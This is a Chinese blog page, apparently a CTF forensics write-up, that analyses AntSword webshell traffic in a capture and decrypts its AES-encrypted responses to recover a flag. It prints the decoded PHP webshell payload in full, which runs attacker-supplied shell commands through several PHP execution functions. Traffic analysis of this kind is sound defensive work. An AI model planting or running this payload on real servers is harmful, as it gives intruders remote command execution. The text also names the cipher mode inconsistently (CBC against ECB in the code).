@@ -1,0 +1,128 @@
+<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>蚁剑流量分析 | 1ux4ry Archive</title><meta name=description content="webshell 流量分析"><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700;800&family=Space+Grotesk:wght@400;500;700&display=swap" rel=stylesheet><link rel=stylesheet href=/css/main.css></head><body><div class=site-bg></div><div class=site-shell><header class=topbar><a class=brand href=/><span>1ux4ry Archive</span></a><nav class=main-nav aria-label=主导航><a href=/>合集</a>
+<a href=/posts/>归档</a>
+<a href=/categories/>分类</a>
+<a href=/tags/>标签</a>
+<a href=/about/>关于</a>
+<a href=/friends/>友链</a>
+<a href=https://github.com/luxuryzcx>GitHub</a></nav></header><section class="page-block article-layout article-layout--with-toc"><aside class=article-toc aria-label=文章大纲><div class=article-toc__inner><p class=article-toc__kicker>ON THIS PAGE</p><div class=article-toc__content><nav id=TableOfContents></nav></div></div></aside><article class=article-single><section class=article-hero-card aria-label=蚁剑流量分析><div class="article-hero-card__glow article-hero-card__glow--cyan"></div><div class="article-hero-card__glow article-hero-card__glow--pink"></div><div class="article-hero-card__glow article-hero-card__glow--amber"></div><p class=article-hero-card__command>1ux4ry@archive:~# ./CTF</p><div class=article-hero-card__title><span class=article-hero-card__title-main>CTF</span>
+<span class=article-hero-card__title-sub>蚁剑流量分析</span></div><p class=article-hero-card__meta>CTF / 流量分析 / 取证 / misc / CTF / 流量分析 / 取证 / misc / 1ux4ry Archive</p><p class=article-hero-card__desc>webshell 流量分析</p></section><header class=page-head><p class=page-kicker>ARTICLE</p><p class=article-series>CTF</p><h1>蚁剑流量分析</h1><div class=single-meta><span>2026-06-16</span>
+<span>CTF / 流量分析 / 取证 / misc</span>
+<span># CTF # 流量分析 # 取证 # misc</span></div></header><div class="page-copy content-body"><p>打开</p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801160583-bb268fda-c60c-4ae4-9daf-779678ab5316.png alt loading=lazy decoding=async></figure></p><p>使用筛选条件</p><p>http.request.method == &ldquo;POST&rdquo;</p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801205806-35ddef06-3ec5-4cab-a2de-8950f24f8dd6.png alt loading=lazy decoding=async></figure></p><p>发现ua头是蚁剑流量</p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801232713-903cf4a3-795c-4dcd-b222-e18193d807bb.png alt loading=lazy decoding=async></figure></p><p>然后提取出所有的蚁剑shell流量包</p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801278448-af2fd6cb-c923-4ea7-b974-2c0bbb4b8dbe.png alt loading=lazy decoding=async></figure></p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801291596-66412409-bc1f-448d-9d49-d05e682e6d9b.png alt loading=lazy decoding=async></figure></p><p>先打开那个shell.php</p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801329885-8197d32a-cdc4-47b6-bab0-591697b56316.png alt loading=lazy decoding=async></figure></p><p>用一个提取脚本</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import re
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>s = &#34;cHr(0x40).ChR(0x69).ChR(0x6e).ChR(0x69)........&#34;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>result = re.findall(r&#39;\((0x[0-9a-fA-F]+)\)&#39;, s)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>print(result)
+</span></span></code></pre></div><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801386872-abb764f7-4c56-4e75-a4e3-496417152fc7.png alt loading=lazy decoding=async></figure></p><p>然后再贴一个脚本进行解密</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a =[&#39;0x40&#39;, &#39;0x69&#39;, &#39;0x6e&#39;, &#39;0x69&#39;,.........]
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>for i in range(len(a)):
+</span></span><span class=line><span class=cl>    print(chr(int(a[i], 16)), end=&#34;&#34;)
+</span></span></code></pre></div><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747801414123-f94e1d64-d4d2-481f-bd09-0448068eeb7c.png alt loading=lazy decoding=async></figure></p><p>改一下php格式</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>@ini_set(&#34;display_errors&#34;, &#34;0&#34;);
+</span></span><span class=line><span class=cl>@set_time_limit(0);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>// 加密输出函数：使用 AES-128-ECB 加密 + Base64 编码
+</span></span><span class=line><span class=cl>function asenc($out) {
+</span></span><span class=line><span class=cl>    @session_start();
+</span></span><span class=line><span class=cl>    $key = &#39;f5045b05abe6ec9b1e37fafa851f5de9&#39;;
+</span></span><span class=line><span class=cl>    return @base64_encode(
+</span></span><span class=line><span class=cl>        openssl_encrypt(
+</span></span><span class=line><span class=cl>            base64_encode($out),
+</span></span><span class=line><span class=cl>            &#39;AES-128-ECB&#39;,
+</span></span><span class=line><span class=cl>            $key,
+</span></span><span class=line><span class=cl>            OPENSSL_RAW_DATA
+</span></span><span class=line><span class=cl>        )
+</span></span><span class=line><span class=cl>    );
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>// 捕获输出并加密返回
+</span></span><span class=line><span class=cl>function asoutput() {
+</span></span><span class=line><span class=cl>    $output = ob_get_contents();
+</span></span><span class=line><span class=cl>    ob_end_clean();
+</span></span><span class=line><span class=cl>    echo &#34;0897d&#34;;         // 前缀标识
+</span></span><span class=line><span class=cl>    echo @asenc($output); // 输出加密后的内容
+</span></span><span class=line><span class=cl>    echo &#34;60c97&#34;;         // 后缀标识
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ob_start(); // 开启输出缓冲区
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>try {
+</span></span><span class=line><span class=cl>    // 获取 POST 参数并解码
+</span></span><span class=line><span class=cl>    $p = base64_decode($_POST[&#34;0xc461e86196f1a&#34;]);
+</span></span><span class=line><span class=cl>    $s = base64_decode($_POST[&#34;0x9ec3fa98a283f&#34;]);
+</span></span><span class=line><span class=cl>    $d = dirname($_SERVER[&#34;SCRIPT_FILENAME&#34;]);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    // 根据系统类型构造命令参数
+</span></span><span class=line><span class=cl>    $c = substr($d, 0, 1) == &#34;/&#34; ? &#34;-c \&#34;{$s}\&#34;&#34; : &#34;/c \&#34;{$s}\&#34;&#34;;
+</span></span><span class=line><span class=cl>    $r = &#34;{$p} {$c}&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    // 判断函数是否可用（排除被禁用的函数）
+</span></span><span class=line><span class=cl>    function fe($f) {
+</span></span><span class=line><span class=cl>        $d = explode(&#34;,&#34;, @ini_get(&#34;disable_functions&#34;));
+</span></span><span class=line><span class=cl>        if (empty($d)) {
+</span></span><span class=line><span class=cl>            $d = array();
+</span></span><span class=line><span class=cl>        } else {
+</span></span><span class=line><span class=cl>            $d = array_map(&#39;trim&#39;, array_map(&#39;strtolower&#39;, $d));
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>        return (function_exists($f) &amp;&amp; is_callable($f) &amp;&amp; !in_array($f, $d));
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    // 执行命令的函数
+</span></span><span class=line><span class=cl>    function runcmd($c) {
+</span></span><span class=line><span class=cl>        $ret = 0;
+</span></span><span class=line><span class=cl>        if (fe(&#39;system&#39;)) {
+</span></span><span class=line><span class=cl>            @system($c, $ret);
+</span></span><span class=line><span class=cl>        } elseif (fe(&#39;passthru&#39;)) {
+</span></span><span class=line><span class=cl>            @passthru($c, $ret);
+</span></span><span class=line><span class=cl>        } elseif (fe(&#39;shell_exec&#39;)) {
+</span></span><span class=line><span class=cl>            print(@shell_exec($c));
+</span></span><span class=line><span class=cl>        } elseif (fe(&#39;exec&#39;)) {
+</span></span><span class=line><span class=cl>            @exec($c, $o, $ret);
+</span></span><span class=line><span class=cl>            print(join(&#34;\n&#34;, $o));
+</span></span><span class=line><span class=cl>        } elseif (fe(&#39;popen&#39;)) {
+</span></span><span class=line><span class=cl>            $fp = @popen($c, &#39;r&#39;);
+</span></span><span class=line><span class=cl>            while (!@feof($fp)) {
+</span></span><span class=line><span class=cl>                print(@fgets($fp, 2048));
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>            @pclose($fp);
+</span></span><span class=line><span class=cl>        } elseif (fe(&#39;antsystem&#39;)) {
+</span></span><span class=line><span class=cl>            @antsystem($c);
+</span></span><span class=line><span class=cl>        } else {
+</span></span><span class=line><span class=cl>            $ret = 127; // 不支持任何执行方式时返回错误码
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>        return $ret;
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    // 执行命令并获取结果
+</span></span><span class=line><span class=cl>    $ret = @runcmd($r . &#34; 2&gt;&amp;1&#34;);
+</span></span><span class=line><span class=cl>    print ($ret != 0) ? &#34;ret={$ret}&#34; : &#34;&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>} catch (Exception $e) {
+</span></span><span class=line><span class=cl>    echo &#34;ERROR://&#34; . $e-&gt;getMessage();
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>asoutput(); // 输出加密后的响应内容
+</span></span><span class=line><span class=cl>die();      // 结束脚本
+</span></span></code></pre></div><p>然后每一个流量包都看一遍</p><p>然后在shell(15).php中找到了密文</p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747806512366-22263ff5-8962-4781-a5ae-dd72e7d662e2.png alt loading=lazy decoding=async></figure></p><p>由上面可知加密方式是aes-cbc的模式</p><p>有了key和密文，然后我们可以写一个脚本</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;?php
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$cipher = &#34;8c2b4kRD1eD+vSZ81FAJ6XClabCR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dZOTFg4DW9MYwG6k3rEvAAR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJHygVK0ad8xG1Qk6pzSaCiR8oFStGnfMRtUJOqc0mgokfKBUrRp3zEbVCTqnNJoKJ1qI47Cz1/qfnNoNARGhLfVhC0RJlfeKCvbPwpjFn//BSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93FIVjxEmVnLHPVr5M/LQPdxSFY8RJlZyxz1a+TPy0D3cUhWPESZWcsc9Wvkz8tA93GnMvJfVbvphfWnt17IOkzYjvv91k2fnYDR7u4nlGM3YitxGYGs9mn+HS5iJBXORtYrcRmBrPZp/h0uYiQVzkbWK3EZgaz2af4dLmIkFc5G1itxGYGs9mn+HS5iJBXORtUq4dBjDRFhDqDyzs9CScJhrd3yMusQ+qsnZkq4Ey7NVJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l0kdMTRZJbqef8foIsWrN5dJHTE0WSW6nn/H6CLFqzeXSR0xNFklup5/x+gixas3l2hDPuDhVN4TaDLzp9bXyfGeCVhvglAaNo2rA/ovnRTTtfA5ZywMOOijj6md5RItqjXwOWcsDDjoo4+pneUSLao18DlnLAw46KOPqZ3lEi2qNfA5ZywMOOijj6md5RItqgS0b9hS7r5TX9YNZo2awgUAyqVacVgwr1NlNQ2k/kihhh0QQfnjeGdZhkz0N0jAKiMzFmAMa7xQ1URxTaHoHjDg3NaWl/8+PVG+pyaKrbNDjfl77POeQE8+0MCHpz6YxWLJ6mwCe1X3uzz/HSHcHSvQBB8FxjOhugOErOXkd3LZi/60Gr4gIEc1JIxA5A2pE/V6Z/DFwNOR4M/IIIWdGr5e2e10&#34;;
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>function decrypt($cipher) {
+</span></span><span class=line><span class=cl>    $key = &#39;f5045b05abe6ec9b1e37fafa851f5de9&#39;;
+</span></span><span class=line><span class=cl>    return @base64_decode(openssl_decrypt(base64_decode($cipher), &#39;AES-128-ECB&#39;, $key, OPENSSL_RAW_DATA));
+</span></span><span class=line><span class=cl>};
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$cipher = substr($cipher, 5, strlen($cipher) - 10);
+</span></span><span class=line><span class=cl>echo decrypt($cipher);
+</span></span><span class=line><span class=cl>?&gt;
+</span></span></code></pre></div><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747808032477-d29884d1-4336-486e-b47f-fb18e7dc19f9.png alt loading=lazy decoding=async></figure></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>YmFiYWJhYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJi
+</span></span><span class=line><span class=cl>YmIKaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGho
+</span></span><span class=line><span class=cl>aGhoaGgKaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGho
+</span></span><span class=line><span class=cl>aGhoaGhoaGgKZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dnZ2dn
+</span></span><span class=line><span class=cl>Z2dnZ2dnZ2dnZ2cKYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJi
+</span></span><span class=line><span class=cl>YmJiYmJiYmJiYmJiYmIKbm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5u
+</span></span><span class=line><span class=cl>bm5ubm5ubm5ubm5ubm5ubm4KZmxhZ3tBbnRTd29yZF9pc19Qb3dlcmZ1bF8zMjIyMjIyISEhIX0K
+</span></span></code></pre></div><p>然后丢到魔法厨子里</p><p><figure class=content-figure><img src=https://cdn.nlark.com/yuque/0/2025/png/46138799/1747808093958-232915c4-8304-4923-bb9e-c671c946fc62.png alt loading=lazy decoding=async></figure></p><p>成功解密成功</p><p>flag{AntSword_is_Powerful_3222222!!!!}</p></div><div class=single-tags><a href=/tags/ctf/># CTF</a>
+<a href=/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/># 流量分析</a>
+<a href=/tags/%E5%8F%96%E8%AF%81/># 取证</a>
+<a href=/tags/misc/># misc</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
